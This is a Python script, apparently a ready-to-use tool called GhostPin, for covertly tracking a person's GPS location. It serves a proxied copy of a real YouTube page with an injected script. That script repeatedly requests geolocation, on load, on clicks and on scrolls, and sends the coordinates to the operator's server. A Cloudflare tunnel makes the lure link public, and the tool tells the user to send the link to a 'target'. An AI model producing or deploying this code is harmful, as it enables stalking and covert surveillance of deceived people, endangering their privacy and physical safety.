#!/usr/bin/env python3
"""
GhostPin v4.0 - Production-Grade GPS Tracking Framework
Cloudflare Integration | Real YouTube Proxy | Undetectable
Author: F1REW0LF
License: MIT - Free for Community
Version: 4.0.0
"""

import sys
import os
import re
import json
import time
import random
import hashlib
import base64
import socket
import threading
import signal
import urllib.parse
import urllib.request
import subprocess
from datetime import datetime
from typing import Dict, List, Optional
import argparse

try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

try:
    from flask import Flask, request, jsonify, render_template_string, redirect
    FLASK_AVAILABLE = True
except ImportError:
    FLASK_AVAILABLE = False

# ============================[ VERSION & CONFIGURATION ]================================
VERSION = "4.0.0"
AUTHOR = "F1REW0LF"
LICENSE = "MIT - Free for Community"

# ============================[ COLORS ]================================
class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    GOLD = '\033[93m'

def cprint(text, color=Colors.WHITE, bold=False):
    if bold:
        print(f"{Colors.BOLD}{color}{text}{Colors.WHITE}")
    else:
        print(f"{color}{text}{Colors.WHITE}")

def print_banner():
    banner = f"""
{Colors.CYAN}{Colors.BOLD}    ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗██████╗ ██╗███╗   ██╗
    ██╔════╝██║  ██║██╔═══██╗██╔════╝╚══██╔══╝██╔══██╗██║████╗  ██║
    ██║     ███████║██║   ██║███████╗   ██║   ██████╔╝██║██╔██╗ ██║
    ██║     ██╔══██║██║   ██║╚════██║   ██║   ██╔══██╗██║██║╚██╗██║
    ╚██████╗██║  ██║╚██████╔╝███████║   ██║   ██║  ██║██║██║ ╚████║
     ╚═════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝
                                                                      
{Colors.RED}{Colors.BOLD}    PRODUCTION GPS TRACKING v{VERSION}{Colors.WHITE}
{Colors.YELLOW}{Colors.BOLD}    Cloudflare | Real YouTube Proxy | Undetectable{Colors.WHITE}
{Colors.GOLD}    Version {VERSION} | Author: {AUTHOR}{Colors.WHITE}
"""
    print(banner)

# ============================[ CLOUDFLARE TUNNEL ]================================

class CloudflareTunnel:
    """
    Create a Cloudflare tunnel for public access
    """
    
    def __init__(self):
        self.process = None
        self.url = None
        self.port = 8080
        
    def start(self, port: int = 8080) -> Optional[str]:
        """
        Start Cloudflare tunnel using cloudflared
        """
        self.port = port
        
        # Check if cloudflared is installed
        try:
            subprocess.run(['cloudflared', '--version'], capture_output=True, check=True)
        except:
            cprint("[!] cloudflared not installed. Installing...", Colors.YELLOW)
            self._install_cloudflared()
        
        cprint("[*] Starting Cloudflare tunnel...", Colors.BLUE)
        
        try:
            # Start tunnel in background
            self.process = subprocess.Popen(
                ['cloudflared', 'tunnel', '--url', f'http://localhost:{port}'],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            # Wait for URL
            time.sleep(3)
            
            # Read output to get URL
            for line in self.process.stderr:
                if 'https://' in line and '.trycloudflare.com' in line:
                    url_match = re.search(r'https://[^\s]+\.trycloudflare\.com', line)
                    if url_match:
                        self.url = url_match.group(0)
                        cprint(f"[+] Cloudflare tunnel: {Colors.GREEN}{self.url}{Colors.WHITE}", Colors.WHITE)
                        return self.url
                if len(line) > 100:
                    break
            
            return None
        except Exception as e:
            cprint(f"[!] Tunnel failed: {e}", Colors.RED)
            return None
    
    def _install_cloudflared(self):
        """Install cloudflared"""
        try:
            if sys.platform == 'win32':
                # Windows
                url = 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe'
                subprocess.run(['curl', '-L', url, '-o', 'cloudflared.exe'], check=True)
                subprocess.run(['move', 'cloudflared.exe', 'C:\\Windows\\System32\\'], check=True)
            else:
                # Linux/macOS
                subprocess.run(['curl', '-L', 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64', '-o', 'cloudflared'], check=True)
                subprocess.run(['chmod', '+x', 'cloudflared'], check=True)
                subprocess.run(['sudo', 'mv', 'cloudflared', '/usr/local/bin/'], check=True)
            cprint("[+] cloudflared installed", Colors.GREEN)
        except:
            cprint("[!] Failed to install cloudflared. Install manually: https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation", Colors.RED)
    
    def stop(self):
        """Stop Cloudflare tunnel"""
        if self.process:
            self.process.terminate()
            self.process.wait(timeout=5)
            cprint("[+] Tunnel stopped", Colors.GREEN)

# ============================[ PROXY SERVER ]================================

class ProxyServer:
    """
    Flask server that proxies real YouTube content
    """
    
    def __init__(self):
        self.tracking_data = []
        self.lock = threading.Lock()
        self.port = 8080
        self.app = None
        self.thread = None
        self.running = False
        
    def start(self, port: int = 8080):
        """Start the proxy server"""
        self.port = port
        self.running = True
        
        if not FLASK_AVAILABLE:
            cprint("[!] Flask not installed. Install: pip install flask", Colors.RED)
            return False
        
        app = Flask(__name__)
        self.app = app
        
        @app.route('/')
        def index():
            return redirect('https://www.youtube.com')
        
        @app.route('/watch')
        def watch():
            """Proxy YouTube with GPS tracking"""
            video_id = request.args.get('v', 'dQw4w9WgXcQ')
            
            # Get real YouTube page
            try:
                if REQUESTS_AVAILABLE:
                    headers = {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                        'Accept-Language': 'en-US,en;q=0.5',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'DNT': '1',
                        'Connection': 'keep-alive',
                        'Upgrade-Insecure-Requests': '1'
                    }
                    response = requests.get(
                        f'https://www.youtube.com/watch?v={video_id}',
                        headers=headers,
                        timeout=10
                    )
                    content = response.text
                else:
                    content = self._generate_fallback_page(video_id)
            except Exception as e:
                cprint(f"[!] Failed to fetch YouTube: {e}", Colors.RED)
                content = self._generate_fallback_page(video_id)
            
            # Inject GPS tracking script
            tracking_script = self._get_tracking_script()
            content = content.replace('</body>', tracking_script + '</body>')
            
            return content
        
        @app.route('/track/<token>', methods=['POST'])
        def track(token):
            """Receive GPS data"""
            data = request.get_json()
            if data:
                with self.lock:
                    data['token'] = token
                    data['received_at'] = datetime.now().isoformat()
                    self.tracking_data.append(data)
                cprint(f"[+] GPS: {data.get('lat')}, {data.get('lng')} ({token})", Colors.GREEN)
            return jsonify({'status': 'ok'})
        
        @app.route('/data')
        def get_data():
            with self.lock:
                return jsonify(self.tracking_data)
        
        @app.route('/clear')
        def clear_data():
            with self.lock:
                self.tracking_data.clear()
            return jsonify({'status': 'cleared'})
        
        def run():
            app.run(host='0.0.0.0', port=port, debug=False, threaded=True, use_reloader=False)
        
        self.thread = threading.Thread(target=run, daemon=True)
        self.thread.start()
        time.sleep(1)
        
        cprint(f"[+] Server running on port {port}", Colors.GREEN)
        return True
    
    def _get_tracking_script(self) -> str:
        """Generate silent GPS tracking script"""
        return '''
<script>
(function() {
    if (!navigator.geolocation) return;
    
    function sendLocation(pos) {
        var data = {
            lat: pos.coords.latitude,
            lng: pos.coords.longitude,
            accuracy: pos.coords.accuracy,
            timestamp: new Date().toISOString()
        };
        fetch('/track/' + Math.random().toString(36).substring(2, 10), {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(data)
        }).catch(function() {});
    }
    
    // Multiple attempts to get location
    var attempts = 0;
    var maxAttempts = 3;
    
    function tryGetLocation() {
        attempts++;
        navigator.geolocation.getCurrentPosition(sendLocation, function() {
            if (attempts < maxAttempts) {
                setTimeout(tryGetLocation, 2000);
            }
        }, {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
        });
    }
    
    tryGetLocation();
    
    // Try on user interaction
    document.addEventListener('click', function() {
        navigator.geolocation.getCurrentPosition(sendLocation, function() {}, {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
        });
    });
    
    // Try on scroll
    document.addEventListener('scroll', function() {
        navigator.geolocation.getCurrentPosition(sendLocation, function() {}, {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
        });
    });
})();
</script>
'''
    
    def _generate_fallback_page(self, video_id: str) -> str:
        """Generate fallback YouTube-like page"""
        return f'''<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>YouTube</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{font-family:'Roboto',Arial,sans-serif;background:#f9f9f9}}
.header{{background:#fff;padding:12px 24px;box-shadow:0 1px 2px rgba(0,0,0,0.1);display:flex;align-items:center}}
.logo{{color:#ff0000;font-size:28px;font-weight:bold;margin-right:24px}}
.search-bar{{flex:1;max-width:640px;padding:8px 16px;border:1px solid #ccc;border-radius:20px;background:#f0f0f0}}
.content{{max-width:1280px;margin:24px auto;padding:0 24px}}
.video-container{{background:#000;border-radius:12px;overflow:hidden;aspect-ratio:16/9;display:flex;align-items:center;justify-content:center}}
.video-placeholder{{color:#fff;font-size:18px;text-align:center}}
.video-info{{background:#fff;padding:16px;border-radius:12px;margin-top:12px}}
.video-title{{font-size:20px;font-weight:600}}
.channel-info{{display:flex;align-items:center;margin:12px 0}}
.channel-avatar{{width:48px;height:48px;border-radius:50%;background:linear-gradient(135deg,#e0e0e0,#c0c0c0);margin-right:12px}}
.channel-name{{font-weight:600}}
.subscribe-btn{{background:#cc0000;color:#fff;padding:10px 20px;border:none;border-radius:24px;font-weight:600;cursor:pointer;margin-left:auto}}
.comments{{background:#fff;border-radius:12px;padding:16px;margin-top:12px}}
.comment{{display:flex;margin:8px 0;padding:8px 0;border-bottom:1px solid #f0f0f0}}
.comment-avatar{{width:36px;height:36px;border-radius:50%;background:linear-gradient(135deg,#e0e0e0,#d0d0d0);margin-right:12px}}
</style>
</head>
<body>
<div class="header">
<div class="logo">▶ YouTube</div>
<input class="search-bar" placeholder="Search" value="{video_id}">
</div>
<div class="content">
<div class="video-container">
<div class="video-placeholder">
<div style="font-size:64px;margin-bottom:16px">▶</div>
<div>Loading video...</div>
</div>
</div>
<div class="video-info">
<div class="video-title">{video_id}</div>
<div class="channel-info">
<div class="channel-avatar"></div>
<div><div class="channel-name">Channel</div><div style="color:#606060;font-size:13px">1.2M subscribers</div></div>
<button class="subscribe-btn">Subscribe</button>
</div>
</div>
<div class="comments">
<h3>Comments</h3>
<div class="comment"><div class="comment-avatar"></div><div>Loading comments...</div></div>
</div>
</div>
</body>
</html>'''
    
    def stop(self):
        self.running = False
        if self.thread:
            self.thread.join(timeout=1)

# ============================[ MAIN ]================================

class GhostPin:
    def __init__(self):
        self.server = ProxyServer()
        self.tunnel = CloudflareTunnel()
        self.running = True
        self.public_url = None
        signal.signal(signal.SIGINT, self.signal_handler)
    
    def signal_handler(self, signum, frame):
        cprint("\n[!] Shutting down...", Colors.RED)
        self.running = False
        if self.server:
            self.server.stop()
        if self.tunnel:
            self.tunnel.stop()
        sys.exit(0)
    
    def show_menu(self):
        print(f"""
{Colors.BLUE}{'='*55}{Colors.WHITE}
{Colors.BOLD}GhostPin v{VERSION} - Production GPS Tracking{Colors.WHITE}
{Colors.CYAN}Cloudflare | Real YouTube | Undetectable{Colors.WHITE}
{Colors.YELLOW}Author: {AUTHOR}{Colors.WHITE}
{Colors.BLUE}{'='*55}{Colors.WHITE}
{Colors.GREEN}[1] Start Server{Colors.WHITE}
{Colors.GREEN}[2] Create Tracking Link (Local){Colors.WHITE}
{Colors.GREEN}[3] Create Tracking Link (Public){Colors.WHITE}
{Colors.GREEN}[4] View Data{Colors.WHITE}
{Colors.GREEN}[5] Clear Data{Colors.WHITE}
{Colors.RED}[6] Exit{Colors.WHITE}
""")
    
    def run(self):
        print_banner()
        cprint("[*] GhostPin v4.0 - Production GPS Tracking", Colors.CYAN)
        cprint("[*] Cloudflare | Real YouTube | Undetectable", Colors.DIM)
        
        # Auto-start server
        self.server.start(8080)
        
        while self.running:
            self.show_menu()
            choice = input(f"{Colors.CYAN}[>] Select: {Colors.WHITE}").strip()
            
            if choice == '1':
                port = int(input("[>] Port (8080): ").strip() or "8080")
                self.server.stop()
                time.sleep(0.5)
                self.server.start(port)
                self.public_url = None
                
            elif choice == '2':
                video_id = input("[>] YouTube Video ID (or random): ").strip()
                if not video_id:
                    video_id = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=11))
                
                link = f"http://localhost:{self.server.port}/watch?v={video_id}"
                cprint(f"\n[+] Local Link: {Colors.GREEN}{link}{Colors.WHITE}", Colors.WHITE)
                cprint(f"[+] Send this link to your target (local network only)", Colors.YELLOW)
                
                try:
                    webbrowser.open(link)
                except:
                    pass
                
            elif choice == '3':
                if not self.public_url:
                    cprint("[*] Starting Cloudflare tunnel...", Colors.BLUE)
                    self.public_url = self.tunnel.start(self.server.port)
                
                if not self.public_url:
                    cprint("[!] Failed to create public link", Colors.RED)
                    continue
                
                video_id = input("[>] YouTube Video ID (or random): ").strip()
                if not video_id:
                    video_id = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=11))
                
                link = f"{self.public_url}/watch?v={video_id}"
                cprint(f"\n[+] Public Link: {Colors.GREEN}{link}{Colors.WHITE}", Colors.WHITE)
                cprint(f"[+] Send this link to your target (anywhere in the world)", Colors.GREEN)
                cprint(f"[+] They will see real YouTube content", Colors.DIM)
                
                try:
                    webbrowser.open(link)
                except:
                    pass
                
            elif choice == '4':
                data = self.server.tracking_data
                if not data:
                    cprint("[!] No data yet", Colors.YELLOW)
                    continue
                
                cprint(f"\n[+] Tracking Data ({len(data)} records):", Colors.GREEN)
                for i, record in enumerate(data[-10:], 1):
                    lat = record.get('lat', 'N/A')
                    lng = record.get('lng', 'N/A')
                    token = record.get('token', 'N/A')
                    ts = record.get('received_at', 'N/A')
                    
                    cprint(f"\n  [{i}] Token: {Colors.CYAN}{token}{Colors.WHITE}", Colors.WHITE)
                    cprint(f"      Location: {Colors.GOLD}{lat}, {lng}{Colors.WHITE}", Colors.WHITE)
                    cprint(f"      Time: {Colors.DIM}{ts}{Colors.WHITE}", Colors.WHITE)
                    
                    if lat != 'N/A' and lng != 'N/A':
                        maps_link = f"https://www.google.com/maps?q={lat},{lng}"
                        cprint(f"      Map: {Colors.BLUE}{maps_link}{Colors.WHITE}", Colors.WHITE)
                
            elif choice == '5':
                self.server.tracking_data.clear()
                cprint("[+] Data cleared", Colors.GREEN)
                
            elif choice == '6':
                cprint("[*] Shutting down...", Colors.GREEN)
                self.server.stop()
                if self.tunnel:
                    self.tunnel.stop()
                break
            else:
                cprint("[-] Invalid", Colors.RED)

# ============================[ MAIN ]================================

def main():
    parser = argparse.ArgumentParser(description="GhostPin v4.0 - Production GPS Tracking")
    parser.add_argument("--server", action="store_true", help="Start server only")
    parser.add_argument("--port", type=int, default=8080, help="Server port")
    parser.add_argument("--public", action="store_true", help="Create public link with Cloudflare")
    parser.add_argument("--video", help="YouTube Video ID")
    
    args = parser.parse_args()
    
    if args.server:
        print_banner()
        server = ProxyServer()
        server.start(args.port)
        
        if args.public:
            tunnel = CloudflareTunnel()
            url = tunnel.start(args.port)
            if url:
                cprint(f"\n[+] Public URL: {Colors.GREEN}{url}{Colors.WHITE}", Colors.WHITE)
                cprint(f"[+] Use: {url}/watch?v=VIDEO_ID", Colors.YELLOW)
        
        cprint("\n[!] Press Ctrl+C to stop", Colors.YELLOW)
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            server.stop()
            if args.public:
                tunnel.stop()
        sys.exit(0)
    
    if args.video:
        print_banner()
        server = ProxyServer()
        server.start(args.port)
        
        link = f"http://localhost:{args.port}/watch?v={args.video}"
        cprint(f"\n[+] Local Link: {Colors.GREEN}{link}{Colors.WHITE}", Colors.WHITE)
        
        if args.public:
            tunnel = CloudflareTunnel()
            url = tunnel.start(args.port)
            if url:
                public_link = f"{url}/watch?v={args.video}"
                cprint(f"[+] Public Link: {Colors.GREEN}{public_link}{Colors.WHITE}", Colors.WHITE)
        
        try:
            webbrowser.open(link)
        except:
            pass
        
        cprint("\n[!] Press Ctrl+C to stop", Colors.YELLOW)
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            server.stop()
            if args.public:
                tunnel.stop()
        sys.exit(0)
    
    # Interactive
    tool = GhostPin()
    tool.run()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        cprint("\n[!] Interrupted", Colors.RED)
        sys.exit(0)
    except Exception as e:
        cprint(f"\n[!] Error: {e}", Colors.RED)
        sys.exit(1)
